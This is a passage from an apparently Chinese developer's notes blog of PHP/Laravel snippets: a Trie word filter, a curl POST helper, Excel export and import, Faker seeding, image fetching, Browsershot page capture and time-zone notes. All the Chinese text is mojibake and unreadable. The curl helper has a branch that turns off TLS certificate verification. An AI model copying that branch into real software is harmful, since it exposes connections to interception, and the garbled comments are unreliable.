<span class="number">0</span>) &#123;</span><br><span class="line">            $flag || $wordLength = <span class="number">0</span>; <span class="comment">//å¦‚æœ$flag == false  èµ‹å€¼$wordLenthä¸º0</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> $wordLength;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$data = [<span class="string">'ç™½ç²‰'</span>, <span class="string">'ç™½ç²‰äºº'</span>, <span class="string">'ç™½ç²‰äººå«©'</span>,<span class="string">'ä¸è¯¥å¤§'</span>];</span><br><span class="line">$wordObj = <span class="keyword">new</span> TrieTree();</span><br><span class="line">$wordObj-&gt;addWords($data);</span><br><span class="line"></span><br><span class="line">$txt = <span class="string">"ç™½ç²‰å•Š,ç™½ç²‰äººï¼Œæˆ‘ä¸è¯¥å¤§å•Š"</span>;</span><br><span class="line">$words = $wordObj-&gt;search($txt);</span><br><span class="line">var_dump($words);die;</span><br></pre></td></tr></table></figure>
<h3 id="curl-https"><a href="#curl-https" class="headerlink" title="curl https"></a>curl https</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">curlè¯·æ±‚httpsï¼Œéœ€è¦è®¾ç½®ipv4è®¿é—®ï¼Œipv6çš„è¯ä¼šå¯¼è‡´è§£æä¸äº†åŸŸåï¼Œphpä»£ç å¦‚ä¸‹ï¼š</span><br><span class="line"><span class="comment">//è¯·æ±‚httpséœ€è¦ç”¨ipv4</span></span><br><span class="line">$curl-&gt;setOption(CURLOPT_IPRESOLVE, CURL_IPRESOLVE_V4);</span><br><span class="line"><span class="comment">/** </span></span><br><span class="line"><span class="comment"> * curl POST </span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * @param   string  url </span></span><br><span class="line"><span class="comment"> * @param   array   æ•°æ® </span></span><br><span class="line"><span class="comment"> * @param   int     è¯·æ±‚è¶…æ—¶æ—¶é—´ </span></span><br><span class="line"><span class="comment"> * @param   bool    HTTPSæ—¶æ˜¯å¦è¿›è¡Œä¸¥æ ¼è®¤è¯ </span></span><br><span class="line"><span class="comment"> * @return  string </span></span><br><span class="line"><span class="comment"> */</span>  </span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">curlPost</span>(<span class="params">$url, $data = array(</span>), <span class="title">$timeout</span> = 30, <span class="title">$CA</span> = <span class="title">true</span>)</span>&#123;    </span><br><span class="line">  </span><br><span class="line">    $cacert = getcwd() . <span class="string">'/cacert.pem'</span>; <span class="comment">//CAæ ¹è¯ä¹¦https://segmentfault.com/a/1190000005856334  </span></span><br><span class="line">    $SSL = substr($url, <span class="number">0</span>, <span class="number">8</span>) == <span class="string">"https://"</span> ? <span class="literal">true</span> : <span class="literal">false</span>;  </span><br><span class="line">      </span><br><span class="line">    $ch = curl_init();  </span><br><span class="line">    curl_setopt($ch, CURLOPT_URL, $url);  </span><br><span class="line">    curl_setopt($ch, CURLOPT_TIMEOUT, $timeout);  </span><br><span class="line">    curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, $timeout<span class="number">-2</span>);  </span><br><span class="line">    <span class="keyword">if</span> ($SSL &amp;&amp; $CA) &#123;  </span><br><span class="line">        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, <span class="literal">true</span>);   <span class="comment">// åªä¿¡ä»»CAé¢å¸ƒçš„è¯ä¹¦  </span></span><br><span class="line">        curl_setopt($ch, CURLOPT_CAINFO, $cacert); <span class="comment">// CAæ ¹è¯ä¹¦ï¼ˆç”¨æ¥éªŒè¯çš„ç½‘ç«™è¯ä¹¦æ˜¯å¦æ˜¯CAé¢å¸ƒï¼‰  </span></span><br><span class="line">        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, <span class="number">2</span>); <span class="comment">// æ£€æŸ¥è¯ä¹¦ä¸­æ˜¯å¦è®¾ç½®åŸŸåï¼Œå¹¶ä¸”æ˜¯å¦ä¸æä¾›çš„ä¸»æœºååŒ¹é…  </span></span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> ($SSL &amp;&amp; !$CA) &#123;  </span><br><span class="line">        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, <span class="literal">false</span>); <span class="comment">// ä¿¡ä»»ä»»ä½•è¯ä¹¦  </span></span><br><span class="line">        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, <span class="number">1</span>); <span class="comment">// æ£€æŸ¥è¯ä¹¦ä¸­æ˜¯å¦è®¾ç½®åŸŸå  </span></span><br><span class="line">    &#125;  </span><br><span class="line">    curl_setopt($ch, CURLOPT_RETURNTRANSFER, <span class="literal">true</span>);  </span><br><span class="line">    curl_setopt($ch, CURLOPT_HTTPHEADER, array(<span class="string">'Expect:'</span>)); <span class="comment">//é¿å…dataæ•°æ®è¿‡é•¿é—®é¢˜  </span></span><br><span class="line">    curl_setopt($ch, CURLOPT_POST, <span class="literal">true</span>);  </span><br><span class="line">    curl_setopt($ch, CURLOPT_POSTFIELDS, $data);  </span><br><span class="line">    <span class="comment">//curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($data)); //data with URLEncode  </span></span><br><span class="line">  </span><br><span class="line">    $ret = curl_exec($ch);  </span><br><span class="line">    <span class="comment">//var_dump(curl_error($ch));  //æŸ¥çœ‹æŠ¥é”™ä¿¡æ¯  </span></span><br><span class="line">  </span><br><span class="line">    curl_close($ch);  </span><br><span class="line">    <span class="keyword">return</span> $ret;    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="Laravel-Excel3-0"><a href="#Laravel-Excel3-0" class="headerlink" title="Laravel-Excel3.0"></a>Laravel-Excel3.0</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br></pre></td><td class="code"><pre><span class="line">composer <span class="built_in">require</span> maatwebsite/excel</span><br><span class="line">app/app æ³¨å†ŒæœåŠ¡åŠé—¨é¢ï¼š</span><br><span class="line"></span><br><span class="line"><span class="string">'providers'</span> =&gt; [   </span><br><span class="line">    Maatwebsite\Excel\ExcelServiceProvider::<span class="class"><span class="keyword">class</span>,</span></span><br><span class="line">]</span><br><span class="line"><span class="string">'aliases'</span> =&gt; [ </span><br><span class="line">    <span class="string">'Excel'</span> =&gt; Maatwebsite\Excel\Facades\Excel::<span class="class"><span class="keyword">class</span>,</span></span><br><span class="line">]</span><br><span class="line">php artisan vendor:publish</span><br><span class="line"></span><br><span class="line">åˆ›å»º app/exports/<span class="keyword">export</span>.php</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">namespace App\Exports;</span><br><span class="line"></span><br><span class="line">use Maatwebsite\Excel\Concerns\FromCollection;</span><br><span class="line">use Maatwebsite\Excel\Concerns\WithHeadings; <span class="comment">//è®¾ç½®æ ‡é¢˜</span></span><br><span class="line">use Maatwebsite\Excel\Concerns\ShouldAutoSize; <span class="comment">//è‡ªåŠ¨å•å…ƒæ ¼å°ºå¯¸</span></span><br><span class="line">use PhpOffice\PhpSpreadsheet\Style\NumberFormat; <span class="comment">//è®¾ç½®å•å…ƒæ ¼æ•°æ®æ ¼å¼</span></span><br><span class="line">use Maatwebsite\Excel\Concerns\WithColumnFormatting; <span class="comment">//è®¾ç½®åˆ—æ ¼å¼</span></span><br><span class="line">use Maatwebsite\Excel\Concerns\WithStrictNullComparison; <span class="comment">//ä¸ºç©ºæ—¶é›¶å¡«å……</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">InvoicesExport</span> <span class="title">implements</span> <span class="title">FromCollection</span>,<span class="title">WithHeadings</span>,<span class="title">WithStrictNullComparison</span>,<span class="title">WithColumnFormatting</span>,<span class="title">ShouldAutoSize</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    protected $data;</span><br><span class="line"></span><br><span class="line">    protected $header;</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    * Excelç±»çš„æ„é€ å‡½æ•°</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    public <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">$data, $header</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $<span class="keyword">this</span>-&gt;data = $data;</span><br><span class="line">        $<span class="keyword">this</span>-&gt;header = $header;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//å¯¼å‡ºæ•°æ®é€»è¾‘</span></span><br><span class="line">    public <span class="function"><span class="keyword">function</span> <span class="title">collection</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> $<span class="keyword">this</span>-&gt;data;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//é¦–è¡Œæ ‡é¢˜</span></span><br><span class="line">    public <span class="function"><span class="keyword">function</span> <span class="title">headings</span>(<span class="params"></span>): <span class="title">array</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> $<span class="keyword">this</span>-&gt;header;</span><br><span class="line">    &#125;</span><br><span class="line">      <span class="comment">//è®¾ç½®åˆ—æ ¼å¼</span></span><br><span class="line">    public <span class="function"><span class="keyword">function</span> <span class="title">columnFormats</span>(<span class="params"></span>): <span class="title">array</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> [</span><br><span class="line">            <span class="comment">//'E' =&gt; NumberFormat::FORMAT_DATE_XLSX14,</span></span><br><span class="line">        ];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">æ§åˆ¶å™¨ä¸­ä½¿ç”¨ï¼š</span><br><span class="line"></span><br><span class="line">public <span class="function"><span class="keyword">function</span> <span class="title">export</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    $data = Post::get();</span><br><span class="line">    $header = [ <span class="string">'ID'</span>,</span><br><span class="line">        <span class="string">'å§“å'</span>,</span><br><span class="line">        <span class="string">'å¹´é¾„'</span>,</span><br><span class="line">        <span class="string">'æ€§åˆ«'</span>,</span><br><span class="line">        <span class="string">'åˆ›å»ºæ—¶é—´'</span>,</span><br><span class="line">        <span class="string">'ä¿®æ”¹æ—¶é—´'</span>];</span><br><span class="line">    <span class="keyword">return</span> \Excel::download(<span class="keyword">new</span> InvoicesExport($data, $header), <span class="string">"æµ‹è¯•å¯¼å‡º.xls"</span>);</span><br><span class="line">&#125;</span><br><span class="line">åˆ›å»º app/Exports/Import.php</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">namespace App\Exports;</span><br><span class="line"></span><br><span class="line">use Maatwebsite\Excel\Concerns\ToArray;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Import</span> <span class="title">implements</span> <span class="title">ToArray</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">  <span class="comment">//é‡æ–°çˆ¶ç±»å®ç°</span></span><br><span class="line">public <span class="function"><span class="keyword">function</span> <span class="title">array</span>(<span class="params">array $array</span>)</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> $array;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">æ§åˆ¶å™¨ä½¿ç”¨ï¼šhttps:<span class="comment">//learnku.com/articles/26940</span></span><br><span class="line"></span><br><span class="line">public <span class="function"><span class="keyword">function</span> <span class="title">import</span>(<span class="params">Request $request</span>)</span>&#123;</span><br><span class="line">    $file = $request-&gt;file(<span class="string">'file'</span>);</span><br><span class="line">    $data = \Excel::toArray(<span class="keyword">new</span> Import(), $file);</span><br><span class="line">    dd($data);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="æ•°æ®å¡«å……åŠŸèƒ½ç”Ÿæˆä¸­æ–‡æµ‹è¯•æ•°æ®"><a href="#æ•°æ®å¡«å……åŠŸèƒ½ç”Ÿæˆä¸­æ–‡æµ‹è¯•æ•°æ®" class="headerlink" title="æ•°æ®å¡«å……åŠŸèƒ½ç”Ÿæˆä¸­æ–‡æµ‹è¯•æ•°æ®"></a>æ•°æ®å¡«å……åŠŸèƒ½ç”Ÿæˆä¸­æ–‡æµ‹è¯•æ•°æ®</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">$factory-&gt;define(App\Product::<span class="class"><span class="keyword">class</span>, <span class="title">function</span> (<span class="title">Faker</span>\<span class="title">Generator</span> $<span class="title">faker</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> [</span><br><span class="line">        <span class="string">'user_id'</span> =&gt; <span class="number">1</span>,</span><br><span class="line">        <span class="string">'name'</span> =&gt; $faker-&gt;name,</span><br><span class="line">        <span class="string">'mobile'</span> =&gt; $faker-&gt;phoneNumber,</span><br><span class="line">        <span class="string">'province'</span> =&gt; $faker-&gt;state,</span><br><span class="line">        <span class="string">'city'</span> =&gt; $faker-&gt;city,</span><br><span class="line">        <span class="string">'area'</span> =&gt; $faker-&gt;area,</span><br><span class="line">        <span class="string">'address'</span> =&gt; $faker-&gt;streetAddress,</span><br><span class="line">        <span class="string">'postcode'</span> =&gt; $faker-&gt;postcode,</span><br><span class="line">    ];</span><br><span class="line">&#125;);</span><br><span class="line">$factory-&gt;define(App\Address::<span class="class"><span class="keyword">class</span>, <span class="title">function</span> () </span>&#123;</span><br><span class="line">    $faker = Faker\Factory::create(<span class="string">'zh_CN'</span>);<span class="comment">//åœ¨ config\app.php æ–‡ä»¶ä¸­åŠ å…¥ faker_locale =&gt; 'zh_CN' å°±å¯ä»¥å®ç°äº†</span></span><br><span class="line"><span class="comment">//https://tianyong90.com/2019/03/10/shi-yong-laravel-shu-ju-tian-chong-gong-neng-sheng-cheng-zhong-wen-ce-shi-shu-ju/</span></span><br><span class="line">    <span class="keyword">return</span> [</span><br><span class="line">        <span class="string">'user_id'</span> =&gt; <span class="number">1</span>,</span><br><span class="line">        <span class="string">'name'</span> =&gt; $faker-&gt;name,</span><br><span class="line">        <span class="string">'mobile'</span> =&gt; $faker-&gt;phoneNumber,</span><br><span class="line">        <span class="string">'province'</span> =&gt; $faker-&gt;state,</span><br><span class="line">        <span class="string">'city'</span> =&gt; $faker-&gt;city,</span><br><span class="line">        <span class="string">'area'</span> =&gt; $faker-&gt;area,</span><br><span class="line">        <span class="string">'address'</span> =&gt; $faker-&gt;streetAddress,</span><br><span class="line">        <span class="string">'postcode'</span> =&gt; $faker-&gt;postcode,</span><br><span class="line">    ];</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
<h3 id="intervention-image-å‘"><a href="#intervention-image-å‘" class="headerlink" title="intervention/image å‘"></a>intervention/image å‘</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// è®°å½•å¼€å§‹æ—¶é—´</span></span><br><span class="line">$startTimestamp = microtime(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">$url = <span class="string">'http://wx.qlogo.cn/mmopen/XxT9TiaJ1ibf06TNRCMjQADS4opDHvQLguLZHpqkRlvuJYZicvJW4iaOalPsKIs0kpZ3F6864ZzibyObYiaucUQSrdp4pFTNDyIpxw/0'</span>;</span><br><span class="line"></span><br><span class="line">$avatar = \Image::make($url);</span><br><span class="line"></span><br><span class="line"><span class="comment">// è®°å½•ç»“æŸæ—¶é—´</span></span><br><span class="line">$endTimestamp = microtime(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">info($startTimestamp);</span><br><span class="line">info($endTimestamp);</span><br><span class="line">info($endTimestamp - $startTimestamp);</span><br><span class="line">$startTimestamp = microtime(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">$client = <span class="keyword">new</span> \GuzzleHttp\Client();</span><br><span class="line"></span><br><span class="line">$url = <span class="string">'http://wx.qlogo.cn/mmopen/XxT9TiaJ1ibf06TNRCMjQADS4opDHvQLguLZHpqkRlvuJYZicvJW4iaOalPsKIs0kpZ3F6864ZzibyObYiaucUQSrdp4pFTNDyIpxw/0'</span>;</span><br><span class="line"></span><br><span class="line">$avatarResponse = $client-&gt;get($url);</span><br><span class="line"></span><br><span class="line">$avatar = \Image::make($avatarResponse-&gt;getBody()-&gt;getContents());</span><br><span class="line"></span><br><span class="line">$endTimestamp = microtime(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">info($startTimestamp);</span><br><span class="line">info($endTimestamp);</span><br><span class="line">info($endTimestamp - $startTimestamp);</span><br><span class="line">å…ˆä½¿ç”¨ GuzzleHttp è·å–å¤´åƒï¼Œå†ä½¿ç”¨ Image::make($data) åˆ›å»ºå¤´åƒã€‚</span><br></pre></td></tr></table></figure>
<h3 id="puppeteer-é‡‡é›†å¼‚æ­¥åŠ è½½çš„ç½‘é¡µå†…å®¹"><a href="#puppeteer-é‡‡é›†å¼‚æ­¥åŠ è½½çš„ç½‘é¡µå†…å®¹" class="headerlink" title="puppeteer é‡‡é›†å¼‚æ­¥åŠ è½½çš„ç½‘é¡µå†…å®¹"></a>puppeteer é‡‡é›†å¼‚æ­¥åŠ è½½çš„ç½‘é¡µå†…å®¹</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">$ composer <span class="built_in">require</span> spatie/browsershot</span><br><span class="line">$ npm i puppeteer --save</span><br><span class="line">https:<span class="comment">//tianyong90.com/2019/03/10/laravel-zhong-shi-yong-puppeteer-cai-ji-yi-bu-jia-zai-de-wang-ye-nei-rong/#å®‰è£…</span></span><br><span class="line">use Spatie\Browsershot\Browsershot;</span><br><span class="line"></span><br><span class="line">public <span class="function"><span class="keyword">function</span> <span class="title">getBodyHtml</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $newsUrl = <span class="string">'https://m.toutiao.com/i6546884151050502660/'</span>;</span><br><span class="line">    </span><br><span class="line">    $html = Browsershot::url($newsUrl)</span><br><span class="line">        -&gt;windowSize(<span class="number">480</span>, <span class="number">800</span>)</span><br><span class="line">        -&gt;userAgent(<span class="string">'Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Mobile Safari/537.36'</span>)</span><br><span class="line">        -&gt;mobile()</span><br><span class="line">        -&gt;touch()</span><br><span class="line">        -&gt;bodyHtml();</span><br><span class="line"></span><br><span class="line">    \Log::info($html);</span><br><span class="line">&#125;</span><br><span class="line">use Spatie\Browsershot\Browsershot;</span><br><span class="line"></span><br><span class="line">public <span class="function"><span class="keyword">function</span> <span class="title">getBodyHtml</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $newsUrl = <span class="string">'https://m.toutiao.com/i6546884151050502660/'</span>;</span><br><span class="line">    </span><br><span class="line">    Browsershot::url($newsUrl)</span><br><span class="line">        -&gt;windowSize(<span class="number">480</span>, <span class="number">800</span>)</span><br><span class="line">        -&gt;userAgent(<span class="string">'Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Mobile Safari/537.36'</span>)</span><br><span class="line">        -&gt;mobile()</span><br><span class="line">        -&gt;touch()</span><br><span class="line">        -&gt;setDelay(<span class="number">1000</span>)</span><br><span class="line">        -&gt;save(public_path(<span class="string">'images/toutiao.jpg'</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="PHPæ—¶åŒº"><a href="#PHPæ—¶åŒº" class="headerlink" title="PHPæ—¶åŒº"></a>PHPæ—¶åŒº</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>ï¼ŒåŒ—äº¬è‹±å›½æ ‡å‡†æ—¶é—´æ—¶å·®æ˜¯<span class="number">8</span>å°æ—¶ã€‚</span><br><span class="line"><span class="number">2</span>ï¼Œè‹±å›½ä¼¦æ•¦ä½¿ç”¨å¤ä»¤æ—¶ï¼ˆå¤æ—¶åˆ¶ï¼‰æ—¶æ—¶å·®æ˜¯<span class="number">7</span>å°æ—¶ã€‚</span><br><span class="line">åŒ—äº¬æ—¶é—´ä¸ºä¸œå…«åŒºçš„åŒºæ—¶UTC+<span class="number">8</span>ï¼Œè‹±å›½ä¼¦æ•¦ä¸ºé›¶æ—¶åŒºçš„åŒºæ—¶UTC+<span class="number">0</span>ï¼Œä¸¤è€…æ—¶å·®ä¸º<span class="number">8</span>å°æ—¶ï¼›</span><br><span class="line">å½“è‹±å›½ä¸ºå¤æ—¶åˆ¶æ—¶ï¼ˆæå‰ä¸€å°æ—¶ï¼‰ï¼Œæ—¶åŒºå˜ä¸ºUTC+<span class="number">1</span>ï¼Œä¸¤è€…æ—¶å·®ä¸º<span class="number">7</span>å°æ—¶ã€‚</span><br><span class="line">è‹±å›½å¤ä»¤æ—¶çš„åŒºé—´ï¼šä»<span class="number">3</span>æœˆæœ€åä¸€ä¸ªæ˜ŸæœŸæ—¥åˆ°<span class="number">10</span>æœˆæœ€åä¸€ä¸ªæ˜ŸæœŸæ—¥ã€‚</span><br><span class="line">å‚è€ƒï¼šhttp:<span class="comment">//baike.baidu.com/view/37429.htm</span></span><br><span class="line">æ—¶å·®çš„è®¡ç®—æ–¹æ³•ï¼šä¸¤ä¸ªæ—¶åŒºæ 